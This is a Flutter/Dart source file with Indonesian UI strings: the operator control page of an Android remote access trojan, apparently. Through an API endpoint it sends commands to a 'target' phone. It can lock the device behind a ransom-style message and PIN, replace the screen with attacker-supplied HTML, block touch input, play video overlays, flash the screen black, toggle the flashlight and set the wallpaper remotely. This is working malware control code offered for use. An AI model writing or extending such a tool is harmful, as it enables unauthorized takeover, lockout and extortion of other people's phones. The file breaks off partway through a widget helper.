import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'config.dart';

class RatControlPage extends StatefulWidget {
  final Map<String, dynamic> device;
  final String uid;

  const RatControlPage({
    super.key,
    required this.device,
    required this.uid,
  });

  @override
  State<RatControlPage> createState() => _RatControlPageState();
}

class _RatControlPageState extends State<RatControlPage> {
  static const Color accentColor = Color(0xFFFF99AC);

  bool _flashOn          = false;
  bool _isLocked         = false;
  bool _isLocking        = false;
  bool _isUnlocking      = false;
  bool _isSending        = false;
  bool _isLockingHtml    = false;
  bool _isUnlockingHtml  = false;
  bool _videoOverlayOn   = false;
  bool _isVideoLoading   = false;
  bool _isStoppingVideo  = false;
  bool _touchBlocked     = false;
  bool _isBlocking       = false;
  bool _isStoppingBlock  = false;
  bool _isBlackScreen    = false;
  bool _isSettingWall    = false;

  // ── Kirim perintah ke API → API forward ke device target ──────────
  Future<bool> _sendCommand(String command, {Map<String, dynamic>? extra}) async {
    setState(() => _isSending = true);
    try {
      final body = <String, dynamic>{
        'uid':      widget.uid,
        'deviceId': widget.device['deviceId'] ?? '',
        'command':  command,
        ...?extra,
      };
      final res = await http.post(
        Uri.parse('$apiBaseUrl/deviceCommand'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode(body),
      ).timeout(const Duration(seconds: 10));

      if (res.statusCode == 200) {
        final data = jsonDecode(res.body) as Map<String, dynamic>;
        return data['success'] == true;
      }
      return false;
    } catch (_) {
      return false;
    } finally {
      if (mounted) setState(() => _isSending = false);
    }
  }

  // ── Flash ON / OFF ─────────────────────────────────────────────────
  Future<void> _setFlash(bool on) async {
    final ok = await _sendCommand(on ? 'startStrobe' : 'stopStrobe');
    if (!mounted) return;
    if (ok) {
      setState(() => _flashOn = on);
      _snack(on ? '💡 Flash ON' : '🔦 Flash OFF',
             on ? Colors.amber : Colors.black54);
    } else {
      _snack('❌ Gagal kirim perintah', Colors.grey);
    }
  }

  // ── Lock Device (pesan + PIN) ──────────────────────────────────────
  Future<void> _showLockDialog() async {
    final msgCtrl = TextEditingController(text: 'HP ANDA TELAH DIKUNCI!');
    final pinCtrl = TextEditingController(text: '1234');

    final ok = await showDialog<bool>(
      context: context,
      barrierDismissible: false,
      builder: (_) => AlertDialog(
        backgroundColor: const Color(0xFF1A1A1A),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(14)),
        title: const Row(children: [
          Icon(Icons.lock, color: accentColor, size: 20),
          SizedBox(width: 8),
          Text('LOCK DEVICE',
              style: TextStyle(color: Colors.white, fontSize: 15,
                  fontWeight: FontWeight.bold, fontFamily: 'monospace')),
        ]),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Text('Pesan untuk target:',
                style: TextStyle(color: Colors.white60, fontSize: 12)),
            const SizedBox(height: 6),
            TextField(
              controller: msgCtrl,
              style: const TextStyle(color: Colors.white, fontFamily: 'monospace'),
              maxLines: 2,
              decoration: InputDecoration(
                hintText: 'HP ANDA DIKUNCI!',
                hintStyle: const TextStyle(color: Colors.white24),
                filled: true, fillColor: Colors.white10,
                border: OutlineInputBorder(
                    borderRadius: BorderRadius.circular(8),
                    borderSide: BorderSide.none),
              ),
            ),
            const SizedBox(height: 14),
            const Text('PIN untuk unlock:',
                style: TextStyle(color: Colors.white60, fontSize: 12)),
            const SizedBox(height: 6),
            TextField(
              controller: pinCtrl,
              keyboardType: TextInputType.number,
              maxLength: 6,
              style: const TextStyle(
                  color: Colors.white, fontFamily: 'monospace',
                  fontSize: 22, letterSpacing: 6),
              decoration: InputDecoration(
                counterText: '',
                hintText: '1234',
                hintStyle: const TextStyle(color: Colors.white24),
                filled: true, fillColor: Colors.white10,
                border: OutlineInputBorder(
                    borderRadius: BorderRadius.circular(8),
                    borderSide: BorderSide.none),
              ),
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context, false),
            child: const Text('BATAL', style: TextStyle(color: Colors.white38)),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: Colors.redAccent,
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
            ),
            onPressed: () => Navigator.pop(context, true),
            child: const Text('KUNCI!',
                style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
          ),
        ],
      ),
    );

    if (ok != true || !mounted) return;

    final msg = msgCtrl.text.trim().isNotEmpty ? msgCtrl.text.trim() : 'HP ANDA DIKUNCI!';
    final pin = pinCtrl.text.trim().isNotEmpty ? pinCtrl.text.trim() : '1234';

    // Dispose controller setelah nilai diambil
    msgCtrl.dispose();
    pinCtrl.dispose();

    setState(() => _isLocking = true);
    final success = await _sendCommand('lockDevice', extra: {'message': msg, 'pin': pin});
    if (!mounted) return;
    setState(() { _isLocking = false; if (success) _isLocked = true; });
    _snack(success ? '✅ Device berhasil dikunci!' : '❌ Lock gagal',
           success ? Colors.redAccent : Colors.grey);
  }

  // ── Unlock Device (pesan + PIN) ────────────────────────────────────
  Future<void> _unlockDevice() async {
    final ok = await showDialog<bool>(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: const Color(0xFF1A1A1A),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(14)),
        title: const Row(children: [
          Icon(Icons.lock_open, color: accentColor, size: 20),
          SizedBox(width: 8),
          Text('UNLOCK DEVICE',
              style: TextStyle(color: Colors.white, fontSize: 15,
                  fontWeight: FontWeight.bold, fontFamily: 'monospace')),
        ]),
        content: const Text('Unlock device target sekarang?',
            style: TextStyle(color: Colors.white70, fontSize: 13)),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context, false),
            child: const Text('BATAL', style: TextStyle(color: Colors.white38)),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: accentColor,
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
            ),
            onPressed: () => Navigator.pop(context, true),
            child: const Text('UNLOCK',
                style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
          ),
        ],
      ),
    );

    if (ok != true || !mounted) return;

    setState(() => _isUnlocking = true);
    final success = await _sendCommand('unlockDevice');
    if (!mounted) return;
    setState(() { _isUnlocking = false; if (success) _isLocked = false; });
    _snack(success ? '✅ Device berhasil di-unlock!' : '❌ Unlock gagal',
           success ? Colors.green : Colors.grey);
  }

  // ── Lock Device + HTML ─────────────────────────────────────────────
  // Hanya input HTML → HP target terkunci & tampilkan HTML tersebut
  Future<void> _showLockHtmlDialog() async {
    final htmlCtrl = TextEditingController();
    String? htmlResult;

    await showDialog<void>(
      context: context,
      barrierDismissible: false,
      builder: (ctx) => StatefulBuilder(
        builder: (ctx, setStateDialog) => AlertDialog(
          backgroundColor: const Color(0xFF1A1A1A),
          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(14)),
          titlePadding: const EdgeInsets.fromLTRB(18, 18, 18, 0),
          contentPadding: const EdgeInsets.fromLTRB(18, 12, 18, 0),
          actionsPadding: const EdgeInsets.fromLTRB(12, 0, 12, 12),
          title: const Row(children: [
            Icon(Icons.code, color: Color(0xFF7EC8E3), size: 20),
            SizedBox(width: 8),
            Text('LOCK DEVICE + HTML',
                style: TextStyle(color: Colors.white, fontSize: 14,
                    fontWeight: FontWeight.bold, fontFamily: 'monospace')),
          ]),
          content: Column(
            mainAxisSize: MainAxisSize.min,
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              const Text('Silahkan input HTML Anda:',
                  style: TextStyle(color: Colors.white60, fontSize: 12,
                      fontFamily: 'monospace')),
              const SizedBox(height: 8),
              Container(
                decoration: BoxDecoration(
                  color: const Color(0xFF0D0D0D),
                  borderRadius: BorderRadius.circular(8),
                  border: Border.all(color: const Color(0xFF7EC8E3).withOpacity(0.3)),
                ),
                child: TextField(
                  controller: htmlCtrl,
                  style: const TextStyle(
                      color: Color(0xFF7EC8E3),
                      fontFamily: 'monospace',
                      fontSize: 12),
                  maxLines: 8,
                  keyboardType: TextInputType.multiline,
                  decoration: const InputDecoration(
                    hintText: '<!DOCTYPE html>\n<html>\n  <body>\n    ...\n  </body>\n</html>',
                    hintStyle: TextStyle(color: Colors.white12, fontSize: 11,
                        fontFamily: 'monospace'),
                    contentPadding: EdgeInsets.all(10),
                    border: InputBorder.none,
                  ),
                ),
              ),
            ],
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(ctx),
              child: const Text('BATAL',
                  style: TextStyle(color: Colors.white38, fontFamily: 'monospace')),
            ),
            ElevatedButton.icon(
              style: ElevatedButton.styleFrom(
                backgroundColor: const Color(0xFF7EC8E3),
                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
              ),
              icon: const Icon(Icons.lock, size: 16, color: Colors.black),
              label: const Text('KUNCI!',
                  style: TextStyle(color: Colors.black,
                      fontWeight: FontWeight.bold, fontFamily: 'monospace')),
              onPressed: () {
                htmlResult = htmlCtrl.text.trim();
                Navigator.pop(ctx);
              },
            ),
          ],
        ),
      ),
    );

    if (!mounted) return;
    // Dispose controller setelah dialog tutup
    htmlCtrl.dispose();
    // Jika batal atau HTML kosong → batalkan
    if (htmlResult == null || htmlResult!.isEmpty) return;

    setState(() => _isLockingHtml = true);
    final success = await _sendCommand(
      'lockDeviceHtml',
      extra: {'html': htmlResult},
    );
    if (!mounted) return;
    setState(() { _isLockingHtml = false; if (success) _isLocked = true; });
    _snack(
      success ? '✅ Device dikunci dengan HTML!' : '❌ Lock HTML gagal',
      success ? const Color(0xFF7EC8E3) : Colors.grey,
    );
  }

  // ── Unlock Device + HTML ───────────────────────────────────────────
  // Langsung unlock — tidak perlu PIN atau pesan
  Future<void> _unlockHtmlDevice() async {
    setState(() => _isUnlockingHtml = true);
    final success = await _sendCommand('unlockDeviceHtml');
    if (!mounted) return;
    setState(() { _isUnlockingHtml = false; if (success) _isLocked = false; });
    _snack(
      success ? '✅ Device berhasil di-unlock!' : '❌ Unlock gagal',
      success ? Colors.green : Colors.grey,
    );
  }

  // ── Video Overlay ON ──────────────────────────────────────────────────
  Future<void> _startVideoOverlay() async {
    setState(() => _isVideoLoading = true);
    final success = await _sendCommand('videoOverlay');
    if (!mounted) return;
    setState(() {
      _isVideoLoading  = false;
      if (success) _videoOverlayOn = true;
    });
    _snack(
      success ? '🎬 Video overlay aktif di device!' : '❌ Gagal kirim perintah',
      success ? const Color(0xFFFF6B35) : Colors.grey,
    );
  }

  // ── Video Overlay OFF ─────────────────────────────────────────────────
  Future<void> _stopVideoOverlay() async {
    setState(() => _isStoppingVideo = true);
    final success = await _sendCommand('stopVideoOverlay');
    if (!mounted) return;
    setState(() {
      _isStoppingVideo  = false;
      if (success) _videoOverlayOn = false;
    });
    _snack(
      success ? '⏹️ Video overlay dihentikan!' : '❌ Gagal menghentikan',
      success ? Colors.green : Colors.grey,
    );
  }

  // ── Blokir semua sentuhan layar ──────────────────────────────────────
  Future<void> _blockTouch() async {
    setState(() => _isBlocking = true);
    final success = await _sendCommand('blockTouch');
    if (!mounted) return;
    setState(() {
      _isBlocking   = false;
      if (success) _touchBlocked = true;
    });
    _snack(
      success ? '🛑 Layar device diblokir!' : '❌ Gagal memblokir layar',
      success ? Colors.deepPurple : Colors.grey,
    );
  }

  // ── Hentikan blokir layar ─────────────────────────────────────────────
  Future<void> _stopBlockTouch() async {
    setState(() => _isStoppingBlock = true);
    final success = await _sendCommand('stopBlockTouch');
    if (!mounted) return;
    setState(() {
      _isStoppingBlock = false;
      if (success) _touchBlocked = false;
    });
    _snack(
      success ? '✅ Layar device normal kembali!' : '❌ Gagal menghentikan blokir',
      success ? Colors.green : Colors.grey,
    );
  }

  // ── Black Screen — kedap-kedip 10x lalu selesai otomatis ────────────
  Future<void> _triggerBlackScreen() async {
    setState(() => _isBlackScreen = true);
    final success = await _sendCommand('blackScreen');
    if (!mounted) return;
    // Tombol kembali normal setelah 11 detik (10 kedip × ~1 detik)
    if (success) {
      Future.delayed(const Duration(seconds: 11), () {
        if (mounted) setState(() => _isBlackScreen = false);
      });
    } else {
      setState(() => _isBlackScreen = false);
    }
    _snack(
      success ? '🖤 Black screen aktif — 10x kedip!' : '❌ Gagal kirim perintah',
      success ? Colors.black87 : Colors.grey,
    );
  }

  // ── Set Wallpaper dari URL ────────────────────────────────────────────
  Future<void> _showSetWallpaperDialog() async {
    final urlCtrl = TextEditingController();
    String? resultUrl;

    await showDialog<void>(
      context: context,
      barrierDismissible: false,
      builder: (ctx) => AlertDialog(
        backgroundColor: const Color(0xFF1A1A1A),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(14)),
        titlePadding: const EdgeInsets.fromLTRB(18, 18, 18, 0),
        contentPadding: const EdgeInsets.fromLTRB(18, 12, 18, 0),
        actionsPadding: const EdgeInsets.fromLTRB(12, 0, 12, 12),
        title: const Row(children: [
          Icon(Icons.wallpaper, color: Color(0xFF4CAF50), size: 20),
          SizedBox(width: 8),
          Text('SET WALLPAPER',
              style: TextStyle(
                  color: Colors.white, fontSize: 14,
                  fontWeight: FontWeight.bold, fontFamily: 'monospace')),
        ]),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Text('Masukkan URL gambar (CatBox/link):',
                style: TextStyle(
                    color: Colors.white60, fontSize: 12,
                    fontFamily: 'monospace')),
            const SizedBox(height: 8),
            Container(
              decoration: BoxDecoration(
                color: const Color(0xFF0D0D0D),
                borderRadius: BorderRadius.circular(8),
                border: Border.all(
                    color: const Color(0xFF4CAF50).withOpacity(0.4)),
              ),
              child: TextField(
                controller: urlCtrl,
                style: const TextStyle(
                    color: Color(0xFF4CAF50),
                    fontFamily: 'monospace',
                    fontSize: 12),
                keyboardType: TextInputType.url,
                maxLines: 2,
                decoration: const InputDecoration(
                  hintText: 'https://files.catbox.moe/xxxxx.jpg',
                  hintStyle: TextStyle(
                      color: Colors.white12, fontSize: 11,
                      fontFamily: 'monospace'),
                  contentPadding: EdgeInsets.all(10),
                  border: InputBorder.none,
                ),
              ),
            ),
            const SizedBox(height: 8),
            const Text(
              '💡 Mendukung: CatBox, Imgur, atau URL gambar apapun',
              style: TextStyle(
                  color: Colors.white30, fontSize: 10,
                  fontFamily: 'monospace'),
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(ctx),
            child: const Text('BATAL',
                style: TextStyle(
                    color: Colors.white38, fontFamily: 'monospace')),
          ),
          ElevatedButton.icon(
            style: ElevatedButton.styleFrom(
              backgroundColor: const Color(0xFF4CAF50),
              shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(8)),
            ),
            icon: const Icon(Icons.wallpaper, size: 16, color: Colors.white),
            label: const Text('SET!',
                style: TextStyle(
                    color: Colors.white,
                    fontWeight: FontWeight.bold,
                    fontFamily: 'monospace')),
            onPressed: () {
              resultUrl = urlCtrl.text.trim();
              Navigator.pop(ctx);
            },
          ),
        ],
      ),
    );

    // Dispose controller setelah dialog tutup — cegah memory leak
    urlCtrl.dispose();

    if (!mounted) return;
    if (resultUrl == null || resultUrl!.isEmpty) return;

    // Validasi URL minimal harus ada http
    if (!resultUrl!.startsWith('http://') &&
        !resultUrl!.startsWith('https://')) {
      _snack('❌ URL harus diawali http:// atau https://', Colors.redAccent);
      return;
    }

    setState(() => _isSettingWall = true);
    final success = await _sendCommand(
      'setWallpaper',
      extra: {'url': resultUrl},
    );
    if (!mounted) return;
    // Beri waktu 10 detik untuk download + set wallpaper
    if (success) {
      Future.delayed(const Duration(seconds: 10), () {
        if (mounted) setState(() => _isSettingWall = false);
      });
    } else {
      setState(() => _isSettingWall = false);
    }
    _snack(
      success
          ? '🖼️ Wallpaper sedang di-set ke device!'
          : '❌ Gagal kirim perintah',
      success ? const Color(0xFF4CAF50) : Colors.grey,
    );
  }

  void _snack(String msg, Color color) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      content: Text(msg,
          style: const TextStyle(fontFamily: 'monospace', fontWeight: FontWeight.bold)),
      backgroundColor: color,
      duration: const Duration(seconds: 2),
      behavior: SnackBarBehavior.floating,
      margin: const EdgeInsets.all(12),
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
    ));
  }

  @override
  Widget build(BuildContext context) {
    final name = (widget.device['deviceName'] ?? 'UNKNOWN').toString().toUpperCase();
    final isOnline = widget.device['online'] == true;

    return Scaffold(
      backgroundColor: const Color(0xFFCED4DA),
      appBar: AppBar(
        backgroundColor: Colors.white,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back, color: Colors.black),
          onPressed: () => Navigator.pop(context),
        ),
        title: const Text('KONTROL DEVICE',
            style: TextStyle(
                color: Colors.black, fontWeight: FontWeight.bold,
                fontSize: 14, letterSpacing: 1, fontFamily: 'monospace')),
        actions: [
          Container(
            margin: const EdgeInsets.only(right: 12),
            padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
            decoration: BoxDecoration(
              color: !isOnline
                  ? Colors.redAccent          // OFFLINE → merah
                  : _isLocked
                      ? Colors.redAccent      // LOCKED  → merah
                      : Colors.greenAccent,   // AKTIF   → hijau
              borderRadius: BorderRadius.circular(20),
            ),
            child: Row(
              mainAxisSize: MainAxisSize.min,
              children: [
                Container(
                  width: 8, height: 8,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: !isOnline
                        ? Colors.white
                        : _isLocked
                            ? Colors.white
                            : Colors.green.shade900,
                  ),
                ),
                const SizedBox(width: 5),
                Text(
                  !isOnline
                      ? 'OFFLINE'
                      : _isLocked
                          ? '🔒 LOCKED'
                          : 'AKTIF',
                  style: TextStyle(
                    color: !isOnline
                        ? Colors.white
                        : _isLocked
                            ? Colors.white
                            : Colors.green.shade900,
                    fontSize: 10,
                    fontWeight: FontWeight.bold,
                    fontFamily: 'monospace',
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
      body: Column(children: [
        // ── Device Info Card ──
        Container(
          margin: const EdgeInsets.fromLTRB(16, 12, 16, 8),
          padding: const EdgeInsets.all(14),
          decoration: BoxDecoration(
            color: Colors.white,
            borderRadius: BorderRadius.circular(14),
            border: Border.all(
                color: isOnline ? accentColor.withOpacity(0.4) : Colors.grey.shade200),
            boxShadow: [BoxShadow(
                color: Colors.black.withOpacity(0.05),
                blurRadius: 8, offset: const Offset(0, 2))],
          ),
          child: Row(children: [
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: isOnline ? accentColor.withOpacity(0.12) : Colors.grey.shade100,
                shape: BoxShape.circle,
              ),
              child: Icon(Icons.phone_android,
                  size: 30,
                  color: isOnline ? accentColor : Colors.grey),
            ),
            const SizedBox(width: 12),
            Expanded(
              child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                Text(
                  name.isEmpty || name == 'UNKNOWN' ? 'ANDROID DEVICE' : name,
                  style: const TextStyle(
                      fontWeight: FontWeight.bold,
                      fontSize: 15,
                      fontFamily: 'monospace'),
                  overflow: TextOverflow.ellipsis,
                ),
                const SizedBox(height: 3),
                Row(children: [
                  Container(
                    width: 7, height: 7,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      color: isOnline ? Colors.green : Colors.redAccent,
                    ),
                  ),
                  const SizedBox(width: 5),
                  Text(
                    isOnline ? 'Online' : 'Offline',
                    style: TextStyle(
                        fontSize: 11,
                        fontFamily: 'monospace',
                        color: isOnline ? Colors.green : Colors.redAccent,
                        fontWeight: FontWeight.w600),
                  ),
                ]),
              ]),
            ),
          ]),
        ),

        // ── Divider ──
        Padding(
          padding: const EdgeInsets.fromLTRB(16, 4, 16, 8),
          child: Row(children: [
            const Text('PILIH KONTROL',
                style: TextStyle(fontWeight: FontWeight.bold, fontSize: 11,
                    fontFamily: 'monospace', letterSpacing: 1, color: Colors.black45)),
            const SizedBox(width: 8),
            const Expanded(child: Divider(color: Colors.black26)),
          ]),
        ),

        // ── Tombol Kontrol ──
        Expanded(
          child: ListView(
            padding: const EdgeInsets.fromLTRB(16, 0, 16, 20),
            children: [

              // 1. FLASH
              _sectionLabel('💡 FLASH / SENTER'),
              Row(children: [
                Expanded(child: _bigBtn(
                  label: 'Flash ON', icon: Icons.light_mode,
                  active: _flashOn,
                  activeColor: Colors.amber, textActive: Colors.black,
                  onTap: (_flashOn || _isSending) ? null : () => _setFlash(true),
                )),
                const SizedBox(width: 10),
                Expanded(child: _bigBtn(
                  label: 'Flash OFF', icon: Icons.light_mode_outlined,
                  active: false, // selalu idle — aktif hanya Flash ON
                  activeColor: accentColor, textActive: Colors.white,
                  onTap: (!_flashOn || _isSending) ? null : () => _setFlash(false),
                )),
              ]),

              const SizedBox(height: 16),

              // 2. LOCK / UNLOCK (pesan + PIN)
              _sectionLabel('🔒 LOCK DEVICE'),
              Row(children: [
                Expanded(child: _bigBtn(
                  label: _isLocking ? 'Mengunci...' : 'Lock Device',
                  icon: Icons.lock,
                  active: _isLocked, activeColor: Colors.redAccent, textActive: Colors.white,
                  onTap: (_isLocking || _isLocked || _isSending) ? null : _showLockDialog,
                  loading: _isLocking,
                )),
                const SizedBox(width: 10),
                Expanded(child: _bigBtn(
                  label: _isUnlocking ? 'Membuka...' : 'Unlock',
                  icon: Icons.lock_open,
                  active: _isLocked && !_isUnlocking,
                  activeColor: accentColor, textActive: Colors.white,
                  onTap: (!_isLocked || _isUnlocking || _isSending) ? null : _unlockDevice,
                  loading: _isUnlocking,
                )),
              ]),

              const SizedBox(height: 16),

              // 3. LOCK + HTML / UNLOCK + HTML
              _sectionLabel('🌐 LOCK DEVICE + HTML'),
              Row(children: [
                Expanded(child: _bigBtnHtml(
                  label: _isLockingHtml ? 'Mengunci...' : 'Lock + HTML',
                  icon: Icons.code,
                  active: false,
                  activeColor: const Color(0xFF7EC8E3),
                  textActive: Colors.black,
                  accentCol: const Color(0xFF7EC8E3),
                  onTap: (_isLockingHtml || _isLocked || _isSending)
                      ? null
                      : _showLockHtmlDialog,
                  loading: _isLockingHtml,
                )),
                const SizedBox(width: 10),
                Expanded(child: _bigBtnHtml(
                  label: _isUnlockingHtml ? 'Membuka...' : 'Unlock + HTML',
                  icon: Icons.lock_open_outlined,
                  active: _isLocked && !_isUnlockingHtml,
                  activeColor: const Color(0xFF7EC8E3),
                  textActive: Colors.black,
                  accentCol: const Color(0xFF7EC8E3),
                  onTap: (!_isLocked || _isUnlockingHtml || _isSending)
                      ? null
                      : _unlockHtmlDevice,
                  loading: _isUnlockingHtml,
                )),
              ]),

              const SizedBox(height: 16),

              // 4. VIDEO OVERLAY / STOP OVERLAY
              _sectionLabel('🎬 VIDEO OVERLAY'),
              Row(children: [
                Expanded(child: _bigBtnVideo(
                  label: _isVideoLoading ? 'Memuat...' : 'Video Overlay',
                  icon: Icons.play_circle_fill,
                  active: _videoOverlayOn,
                  activeColor: const Color(0xFFFF6B35),
                  idleColor: const Color(0xFFFF6B35),
                  onTap: (_isVideoLoading || _videoOverlayOn || _isSending)
                      ? null
                      : _startVideoOverlay,
                  loading: _isVideoLoading,
                )),
                const SizedBox(width: 10),
                Expanded(child: _bigBtnVideo(
                  label: _isStoppingVideo ? 'Menghentikan...' : 'Stop Overlay',
                  icon: Icons.stop_circle,
                  active: _videoOverlayOn && !_isStoppingVideo,
                  activeColor: Colors.redAccent,
                  idleColor: Colors.redAccent,
                  onTap: (!_videoOverlayOn || _isStoppingVideo || _isSending)
                      ? null
                      : _stopVideoOverlay,
                  loading: _isStoppingVideo,
                )),
              ]),

              const SizedBox(height: 16),

              // 5. BLOKIR LAYAR / STOP BLOKIR
              _sectionLabel('🛑 BLOKIR LAYAR'),
              Row(children: [
                Expanded(child: _bigBtnVideo(
                  label: _isBlocking ? 'Memblokir...' : 'Blokir Layar',
                  icon: Icons.do_not_touch,
                  active: _touchBlocked,
                  activeColor: Colors.deepPurple,
                  idleColor: Colors.deepPurple,
                  onTap: (_isBlocking || _touchBlocked || _isSending)
                      ? null
                      : _blockTouch,
                  loading: _isBlocking,
                )),
                const SizedBox(width: 10),
                Expanded(child: _bigBtnVideo(
                  label: _isStoppingBlock ? 'Menghentikan...' : 'Stop Blokir',
                  icon: Icons.touch_app,
                  active: _touchBlocked && !_isStoppingBlock,
                  activeColor: Colors.green,
                  idleColor: Colors.green,
                  onTap: (!_touchBlocked || _isStoppingBlock || _isSending)
                      ? null
                      : _stopBlockTouch,
                  loading: _isStoppingBlock,
                )),
              ]),

              const SizedBox(height: 16),

              // 6. BLACK SCREEN — kedap-kedip 10x otomatis selesai
              _sectionLabel('🖤 BLACK SCREEN'),
              Row(children: [
                Expanded(child: _bigBtnVideo(
                  label: _isBlackScreen ? 'Kedip... (10x)' : 'Black Screen',
                  icon: Icons.brightness_1,
                  active: _isBlackScreen,
                  activeColor: Colors.black87,
                  idleColor: Colors.black87,
                  onTap: (_isBlackScreen || _isSending) ? null : _triggerBlackScreen,
                  loading: _isBlackScreen,
                )),
                const SizedBox(width: 10),
                // Keterangan — tidak ada tombol stop karena otomatis selesai
                Expanded(
                  child: Container(
                    padding: const EdgeInsets.symmetric(vertical: 20, horizontal: 12),
                    decoration: BoxDecoration(
                      color: Colors.grey.shade100,
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(color: Colors.black12),
                    ),
                    child: const Column(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(Icons.info_outline, size: 24, color: Colors.black38),
                        SizedBox(height: 6),
                        Text(
                          'Auto stop\nsetelah 10x',
                          textAlign: TextAlign.center,
                          style: TextStyle(
                            color: Colors.black38,
                            fontSize: 11,
                            fontFamily: 'monospace',
                            fontWeight: FontWeight.bold,
                          ),
                        ),
                      ],
                    ),
                  ),
                ),
              ]),

              const SizedBox(height: 16),

              // 7. SET WALLPAPER dari URL
              _sectionLabel('🖼️ SET WALLPAPER'),
              GestureDetector(
                onTap: (_isSettingWall || _isSending)
                    ? null
                    : _showSetWallpaperDialog,
                child: AnimatedContainer(
                  duration: const Duration(milliseconds: 200),
                  width: double.infinity,
                  padding: const EdgeInsets.symmetric(vertical: 20),
                  decoration: BoxDecoration(
                    color: _isSettingWall
                        ? const Color(0xFF4CAF50)
                        : Colors.white,
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(
                      color: (_isSettingWall || _isSending)
                          ? const Color(0xFF4CAF50)
                          : const Color(0xFF4CAF50).withOpacity(0.5),
                      width: 1.5,
                    ),
                    boxShadow: [
                      BoxShadow(
                        color: const Color(0xFF4CAF50).withOpacity(0.1),
                        blurRadius: 8,
                        offset: const Offset(0, 2),
                      ),
                    ],
                  ),
                  child: _isSettingWall
                      ? const Center(
                          child: SizedBox(
                            width: 24, height: 24,
                            child: CircularProgressIndicator(
                                strokeWidth: 2, color: Colors.white),
                          ),
                        )
                      : const Column(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            Icon(Icons.wallpaper,
                                size: 30, color: Color(0xFF4CAF50)),
                            SizedBox(height: 8),
                            Text('Set Wallpaper',
                                style: TextStyle(
                                    color: Color(0xFF4CAF50),
                                    fontWeight: FontWeight.bold,
                                    fontSize: 13,
                                    fontFamily: 'monospace')),
                            SizedBox(height: 4),
                            Text('Input URL → Tap SET!',
                                style: TextStyle(
                                    color: Colors.black38,
                                    fontSize: 10,
                                    fontFamily: 'monospace')),
                          ],
                        ),
                ),
              ),

            ],
          ),
        ),
      ]),
    );
  }

  Widget _sectionLabel(String text) => Padding(
    padding: const EdgeInsets.only(bottom: 8),
    child: Text(text,
        style: const TextStyle(fontSize: 11, fontWeight: FontWeight.bold,
            fontFamily: 'monospace', color: Colors.black45, letterSpacing: 1)),
  );

  // ── Tombol biasa (Lock/Unlock/Flash) ──────────────────────────────
  Widget _bigBtn({
    required String label, required IconData icon,
    required bool active, required Color activeColor, required Color textActive,
    required VoidCallback? onTap, bool loading = false,
  }) {
    final disabled = onTap == null && !loading;
    final bg     = disabled ? Colors.grey.shade100 : (active ? activeColor : Colors.white);
    final fg     = disabled ? Colors.black26 : (active ? textActive : Colors.black87);
    final border = disabled ? Colors.black12 : (active ? activeColor : Colors.black26);

    return GestureDetector(
      onTap: loading ? null : onTap,
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 200),
        padding: const EdgeInsets.symmetric(vertical: 20),
        decoration: BoxDecoration(
          color: bg,
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: border, width: 1.5),
          boxShadow: [BoxShadow(
              color: Colors.black.withOpacity(0.04),
              blurRadius: 8, offset: const Offset(0, 2))],
        ),
        child: loading
            ? const Center(child: SizedBox(width: 24, height: 24,
                child: CircularProgressIndicator(strokeWidth: 2, color: Colors.black54)))
            : Column(mainAxisAlignment: MainAxisAlignment.center, children: [
                Icon(icon, size: 28, color: fg),
                const SizedBox(height: 8),
                Text(label, textAlign: TextAlign.center,
                    style: TextStyle(color: fg, fontWeight: FontWeight.bold,
                        fontSize: 12, fontFamily: 'monospace')),
              ]),
      ),
    );
  }

  // ── Tombol HTML (warna biru muda, selalu putih bg saat idle) ──────
  Widget _bigBtnHtml({
    required String label, required IconData icon,
    required bool active, required Color activeColor,
    required Color textActive, required Color accentCol,
    required VoidCallback? onTap, bool loading = false,
  }) {
    final disabled = onTap == null && !loading;
    final bg     = disabled
        ? Colors.grey.shade100
        : (active ? activeColor : Colors.white);
    final fg     = disabled
        ? Colors.black26
        : (active ? textActive : accentCol);
    final border = disabled
        ? Colors.black12
        : (active ? activeColor : accentCol.withOpacity(0.5));

    return GestureDetector(
      onTap: loading ? null : onTap,
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 200),
        padding: const EdgeInsets.symmetric(vertical: 20),
        decoration: BoxDecoration(
          color: bg,
